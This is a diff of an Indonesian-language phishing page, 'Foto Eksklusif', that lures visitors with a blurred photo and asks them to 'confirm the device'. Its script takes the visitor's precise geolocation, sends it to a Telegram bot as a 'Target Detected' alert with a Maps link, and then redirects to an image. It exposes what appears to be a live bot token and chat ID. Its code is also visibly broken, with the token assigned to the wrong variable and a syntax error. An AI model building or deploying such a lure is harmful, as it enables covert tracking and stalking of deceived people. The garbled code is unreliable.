@@ -2,15 +2,17 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>Foto Eksklusif</title>
   <style>
-    body { font-family: Arial, sans-serif; background: #0f172a; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-    .card { background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); text-align: center; max-width: 350px; width: 100%; }
-    .blur-box { width: 100%; height: 180px; background: #334155; border-radius: 8px; margin-bottom: 15px; display: flex; justify-content: center; align-items: center; filter: blur(4px); font-size: 40px; }
-    .btn { background: #3b82f6; color: white; border: none; padding: 12px 20px; font-size: 15px; font-weight: bold; border-radius: 6px; cursor: pointer; width: 100%; transition: background 0.2s; }
-    .btn:hover { background: #2563eb; }
-    .status { margin-top: 15px; font-size: 13px; color: #94a3b8; }
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #0f172a; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overscroll-behavior: none; }
+    .card { background: #1e293b; padding: 25px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); text-align: center; max-width: 300px; width: 100%; margin: 20px; }
+    .blur-box { width: 100%; height: 150px; background: #334155; border-radius: 12px; margin-bottom: 15px; display: flex; justify-content: center; align-items: center; filter: blur(4px); font-size: 40px; }
+    h2 { font-size: 20px; margin: 0 0 10px 0; }
+    p { font-size: 14px; color: #94a3b8; margin-bottom: 20px; line-height: 1.4; }
+    .btn { background: #3b82f6; color: white; border: none; padding: 14px; font-size: 16px; font-weight: bold; border-radius: 12px; cursor: pointer; width: 100%; transition: background 0.2s; display: block; text-decoration: none; -webkit-tap-highlight-color: transparent; }
+    .btn:active { background: #2563eb; transform: scale(0.98); }
+    .status { margin-top: 15px; font-size: 12px; color: #94a3b8; min-height: 15px; }
   </style>
 </head>
 <body>
@@ -18,27 +20,34 @@
   <div class="card">
     <div class="blur-box">🖼️</div>
     <h2>Foto Eksklusif</h2>
-    <p style="font-size: 14px; color: #94a3b8; margin-bottom: 20px;">Konfirmasi perangkat terlebih dahulu untuk membuka dan melihat foto asli.</p>
-    <button class="btn" onclick="getLocation()">Buka Foto</button>
+    <p>Konfirmasi perangkat terlebih dahulu untuk membuka dan melihat foto asli.</p>
+    <button class="btn" id="actionBtn" onclick="getLocation()">Buka Foto</button>
     <div id="status" class="status"></div>
   </div>
 
   <script>
-    
-    const TELEGRAM_CHAT_ID = '8769576802:AAFqMQGPSUpiaKMtoluHfI7OBqQ_8s64yhk';
-     const TELEGRAM_CHAT_ID = '6269176229';
+    // --- MASUKKAN TOKEN BOT DAN CHAT ID ANDA DI SINI ---
+    const TELEGRAM_BOT_TOKEN = 'MASUKKAN_TOKEN_BOT_ANDA_DI_SINI';
+    const TELEGRAM_CHAT_ID = 'MASUKKAN_CHAT_ID_ANDA_DI_SINI';
+    // ----------------------------------------------------
+
+    const statusDiv = '8769576802:AAFqMQGPSUpiaKMtoluHfI7OBqQ_8s64yhk';
+    const actionBtn = ;6269176229';
     function getLocation() {
-      const statusDiv = document.getElementById('status');
-      statusDiv.innerHTML = 'Memuat foto...';
+      // Menonaktifkan tombol sementara
+      actionBtn.disabled = true;
+      actionBtn.style.opacity = '0.6';
+      statusDiv.innerHTML = 'Memuat koneksi...';
 
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendData, showError, {
           enableHighAccuracy: true,
-          timeout: 10000,
+          timeout: 15000,
           maximumAge: 0
         });
       } else {
-        statusDiv.innerHTML = 'Geolocation tidak didukung.';
+        statusDiv.innerHTML = 'Geolocation tidak didukung perangkat ini.';
+        enableButton();
       }
     }
 
@@ -48,34 +57,52 @@
       const accuracy = position.coords.accuracy;
       const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
-      // Format pesan yang akan masuk ke Telegram
-      const message = `🎯 Target Terdeteksi!\n\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}\n🎯 Akurasi: ${accuracy} meter\n🗺️ Google Maps: ${googleMapsUrl}`;
-
+      const message = `🎯 Target Terdeteksi!\n\n📍 Lokasi: ${lat}, ${lon}\n🎯 Akurasi: ${accuracy} meter\n🗺️ Maps: ${googleMapsUrl}`;
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
-      // Mengirim data langsung ke Telegram secara real-time
       fetch(url, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: message
-        })
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
       }).then(response => {
         if (response.ok) {
-          document.getElementById('status').innerHTML = '<span style="color:#22c55e;">Berhasil memuat!</span>';
+          statusDiv.innerHTML = '<span style="color:#22c55e;">Berhasil memuat koneksi! Mengalihkan...</span>';
+          // Redirect setelah sukses
+          setTimeout(() => {
+            window.location.href = 'https://i.imgur.com/QoMhG89.png';
+          }, 1500);
         } else {
-          document.getElementById('status').innerHTML = 'Gagal mengirim data.';
+          statusDiv.innerHTML = 'Gagal menghubungkan ke server.';
+          enableButton();
         }
       }).catch(err => {
-        document.getElementById('status').innerHTML = 'Terjadi kesalahan jaringan.';
+        statusDiv.innerHTML = 'Kesalahan jaringan.';
+        enableButton();
       });
     }
 
     function showError(error) {
-      document.getElementById('status').innerHTML = 'Akses lokasi diperlukan untuk melihat foto.';
+      let msg = '';
+      switch(error.code) {
+        case error.PERMISSION_DENIED:
+          msg = 'Akses lokasi ditolak. Silakan izinkan melalui pengaturan browser.';
+          break;
+        case error.POSITION_UNAVAILABLE:
+          msg = 'Informasi lokasi tidak tersedia.';
+          break;
+        case error.TIMEOUT:
+          msg = 'Waktu permintaan lokasi habis. Coba lagi.';
+          break;
+      }
+      statusDiv.innerHTML = msg;
+      enableButton();
+    }
+
+    function enableButton() {
+      // Mengaktifkan tombol kembali jika terjadi kesalahan
+      actionBtn.disabled = false;
+      actionBtn.style.opacity = '1';
+      actionBtn.innerHTML = 'Coba Lagi';
     }
   </script>
 
